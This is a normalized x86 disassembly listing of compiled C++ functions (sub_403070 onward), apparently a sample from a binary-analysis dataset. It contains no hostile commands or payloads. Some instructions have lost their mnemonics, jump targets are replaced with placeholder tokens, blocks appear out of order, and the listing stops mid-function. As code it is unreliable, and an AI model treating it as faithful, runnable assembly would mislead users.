sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xccccccc
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_41ac98
lea eax [ ecx + ecx * 4 ]
add eax eax
add eax eax
push eax
call sub_41ac18
add esp 0x4
test eax eax
jne r-xdata
sub_403070
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x1fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_41ac98
lea eax [ ecx * 8 ]
push eax
call sub_41ac18
add esp 0x4
test eax eax
jne r-xdata
sub_4030d0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov [ edi ] edx
pop edi
pop esi
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] edx
mov [ edi ] eax
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_403140
push ebp
mov ebp esp
push 0xffffffff
push sub_42cf40
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_4030d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4031bb
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_41ac98
int3
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_41a0d6
add esp 0x4
push eax
call sub_41a7eb
add esp 0x4
sub_4031f0
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
sub_403220
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
mov edx [ esi + 0x4 ]
lea eax [ ecx + 0x4 ]
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
push ecx
call sub_41a460
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0xc
add [ esi + 0x4 ] 0xfffffffc
mov [ eax ] ecx
pop esi
pop ebp
retn 0x8
sub_403260
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
cmp eax 0x3fffffff
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
sar ecx 0x2
cmp ecx eax
jae r-xdata
push r--data
call sub_4194e6
pop esi
pop ebp
retn 0x4
push ebx
push edi
push eax
lea ecx [ esi + 0xc ]
call sub_402fb0
mov edx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
push ebx
call sub_41a460
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + edi * 4 ]
lea ecx [ ebx + eax * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] edx
pop ebx
push eax
call sub_41a0d6
add esp 0x4
sub_4032e0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] eax
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi + 0x4 ]
push esi
test edx edx
je r-xdata
pop esi
push ebx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push edi
push edx
call sub_4030d0
pop ebx
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
lea ecx [ edx + 0x1 ]
lea ebx [ edi + 0x4 ]
mov eax edx
[ ebx ] ecx
cmp eax edx
je r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x4
sub_403340
push ebp
mov ebp esp
push 0xffffffff
push sub_42cf60
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_4030d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4033bb
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_41ac98
int3
mov eax [ esi ]
push eax
call sub_41a7eb
push esi
call sub_41a0d6
add esp 0x8
sub_4033e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
sub edi edx
mov ecx ebx
sub ecx edx
sar edi 0x2
sar ecx 0x2
mov eax ecx
mov esi edi
test edi edi
je r-xdata
cmp eax ecx
jge r-xdata
cdq
idiv esi
mov eax esi
mov esi edx
test edx edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
jle r-xdata
mov edx [ ebp + 0x8 ]
lea edx [ edx + eax * 4 ]
mov [ ebp + 0xc ] edx
nop
mov edx [ esi ]
mov ebx [ ecx ]
mov [ esi ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx ] edx
mov edx ebx
sub edx ecx
sar edx 0x2
mov esi ecx
cmp edi edx
jge r-xdata
mov ecx [ ebp + 0x8 ]
lea esp [ esp ]
mov ecx edi
sub ecx edx
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea edx [ edi * 4 ]
add ecx edx
jmp r-xdata
dec eax
sub edx 0x4
mov [ ebp + 0xc ] edx
test eax eax
jg r-xdata
mov edx [ ebp + 0xc ]
cmp ecx edx
jne r-xdata
lea ecx [ edx + edi * 4 ]
mov esi edx
cmp ecx ebx
jne r-xdata
sub_403480
push ebp
mov ebp esp
push 0xffffffff
push sub_42cf9b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x18
mov edi ecx
call sub_41ac18
add esp 0x4
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_412420
mov esi eax
jmp r-xdata
mov ecx [ edi + 0x14 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
mov edx [ ebp - 0x2c ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
push 0xb
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4124b0
push 0x10
push rw-data
mov ecx esi
call sub_412490
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_412790
push 0x1c
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_412490
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call sub_412790
mov [ ebp - 0x4 ] 0x2
test esi esi
je r-xdata
mov eax [ ebp - 0x48 ]
cmp [ ebp - 0x34 ] esi
jae r-xdata
lea edx [ ebp - 0x2c ]
mov ecx [ edi + 0x20 ]
mov edi [ ecx ]
push edx
mov edx [ edi + 0x8 ]
push eax
call edx
cmp [ ebp - 0x18 ] esi
jb r-xdata
lea eax [ ebp - 0x48 ]
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
sub_4035c0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call sub_41a0d6
add esp 0x4
sub_4035f0
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx ]
push edi
sub eax esi
mov edi 0x3fffffff
sar eax 0x2
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
mov edx [ ecx + 0x8 ]
sub edx esi
sar edx 0x2
cmp eax edx
jbe r-xdata
push r--data
call sub_4194e6
pop edi
pop esi
pop ebp
retn 0x4
mov esi edx
shr esi 0x1
mov edi 0x3fffffff
sub edi esi
cmp edi edx
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_403260
mov edx eax
cmp edx eax
jae r-xdata
sub_403650
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
cmp edi 0x7ffffffe
jbe r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_4194e6
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_401520
test edi edi
je r-xdata
cmp edx 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx eax
jbe r-xdata
mov eax esi
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax [ esi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
push ebx
lea ebx [ edi + edi ]
push ebx
push edx
push eax
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
sub eax ecx
push edx
sar eax 0x1
push eax
push esi
mov ecx esi
call sub_401ae0
pop edi
pop esi
pop ebp
retn 0x8
sub_403740
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
add [ esi + 0x4 ] 0x4
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_4194e6
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx esi
call sub_403260
mov ecx eax
cmp ecx eax
jae r-xdata
sub_4037b0
push ebp
mov ebp esp
push 0xffffffff
push sub_42cfd0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
xor edi edi
push edx
mov [ ebp - 0x4 ] edi
call eax
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
call sub_403140
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
cmp ecx edi
jne r-xdata
mov eax [ ecx ]
mov edx [ esi + 0x38 ]
cmp eax [ edx ]
je r-xdata
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
cmp esi edi
je r-xdata
mov eax [ esi + 0x24 ]
mov edx [ esi + 0x28 ]
sub edx eax
sar edx 0x2
mov [ ebp - 0xd ] 0x0
test edx edx
je r-xdata
mov al [ esi + 0x34 ]
cmp al 0xff
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp esi edi
je r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
cmp esi edi
je r-xdata
jmp r-xdata
mov ecx [ esi + 0x24 ]
movzx eax al
mov esi [ ecx + eax * 4 ]
sub esp 0x8
mov ecx esp
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] esp
push edx
mov [ ecx ] edi
mov [ ecx + 0x4 ] edi
call sub_4032e0
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp esi edi
je r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov eax [ eax + edi * 4 ]
movzx ebx [ ecx + 0x4 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
cmp ax bx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov cl [ ebp - 0xd ]
mov eax [ esi + 0x24 ]
inc cl
movzx edi cl
mov [ ebp - 0xd ] cl
mov ecx [ esi + 0x28 ]
sub ecx eax
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx + edi * 4 ]
sub esp 0x8
mov ecx esp
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] esp
push edx
mov [ ecx ] 0x0
mov [ ecx + 0x4 ] 0x0
call sub_4032e0
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov ecx [ ebp - 0x1c ]
xor edi edi
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_4039d0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x8 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_4035f0
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x4
pop edi
pop esi
pop ebp
retn 0x4
mov ecx [ edi ]
mov [ eax ] ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_4035f0
mov ecx [ esi ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
add [ esi + 0x4 ] 0x4
pop edi
pop esi
pop ebp
retn 0x4
sub_403a40
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_41a460
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
sub_403ae0
push ebp
mov ebp esp
mov eax [ ecx + 0x3c ]
sub eax [ ecx + 0x38 ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
lea esi [ ecx + 0x38 ]
sar eax 0x2
xor dl dl
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
mov edi [ esi ]
xor ecx ecx
nop
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
cmp edx ecx
ja r-xdata
pop edi
pop esi
xor al al
pop ebx
pop ebp
retn 0x4
inc dl
movzx ecx dl
cmp ecx eax
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ esi + 0x8 ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
cmp [ edi + ecx * 4 ] ebx
je r-xdata
add [ esi + 0x4 ] 0x4
mov edi [ esi ]
mov eax [ esi + 0x4 ]
cmp edi eax
jae r-xdata
mov [ eax ] ebx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_4194e6
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx edi
cmp edx edi
ja r-xdata
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov edx [ esi ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_4194e6
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx edi
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
add [ esi + 0x4 ] 0x4
pop edi
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
mov edx [ edi ]
mov [ eax ] edx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_4194e6
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
push ecx
mov ecx esi
call sub_403260
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
mov edx [ esi ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
add [ esi + 0x4 ] 0x4
pop edi
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_4194e6
push ecx
mov ecx esi
call sub_403260
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
mov ecx esi
call sub_403260
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx esi
call sub_403260
mov ecx eax
cmp ecx eax
jae r-xdata
sub_403cc0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_403650
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_403d10
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x10 ]
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0x10 ]
push edi
mov edi [ ebx + 0x4 ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] ecx
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
mov [ esi ] 0x0
add esi 0x8
add ebx 0x8
cmp esi [ ebp + 0xc ]
jne r-xdata
lea eax [ edi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
lea edx [ ebp - 0x8 ]
xor ecx ecx
xor eax eax
cmp edx esi
je r-xdata
pop edi
mov eax ebx
pop ebx
pop esi
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
sub_403d90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
push esi
push edi
lea edi [ eax + 0x4 ]
add edi 0x8
lea eax [ edi - 0x4 ]
cmp eax ebx
jne r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
pop esi
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_403df0
push ebp
mov ebp esp
push 0xffffffff
push sub_42cff8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax [ esi + 0x38 ]
mov edx [ eax ]
mov [ ecx ] edx
mov edx [ esi + 0x38 ]
cmp eax [ edx ]
je r-xdata
sub esp 0x8
mov ecx esp
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push edx
mov [ ecx ] 0x0
mov [ ecx + 0x4 ] 0x0
call sub_4032e0
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
cmp al 0x34
je r-xdata
push eax
mov ecx esi
call sub_403ae0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
cmp al 0x35
je r-xdata
mov edx [ ebp + 0x8 ]
mov al [ edx + 0x6 ]
cmp al 0x33
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
cmp al 0x36
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
push edx
mov edx [ eax + 0x4 ]
call edx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + 0x7 ]
sub esp 0x8
cmp cl [ rw-data ]
mov [ ebp - 0x10 ] esp
mov ecx esp
push eax
jne r-xdata
call sub_401a10
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call sub_401a10
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
jmp r-xdata
call eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_412e20
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_403f30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x20 ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
mov ebx [ edi + 0x38 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
sub ebx ebx
push eax
lea ecx [ edi + 0x38 ]
sar ebx 0x2
call sub_403740
mov eax [ edi + 0x3c ]
mov esi [ edi + 0x38 ]
lea edx [ esi + ebx * 4 ]
lea ecx [ eax - 0x4 ]
xor ebx ebx
cmp edx ecx
je r-xdata
mov ecx [ rw-data ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
mov [ edi + 0x48 ] bl
push ebx
mov esi 0x7
xor edx edx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] dx
call sub_403650
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
cmp eax ebx
je r-xdata
cmp ecx eax
je r-xdata
mov eax [ rw-data ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
push ebx
xor edx edx
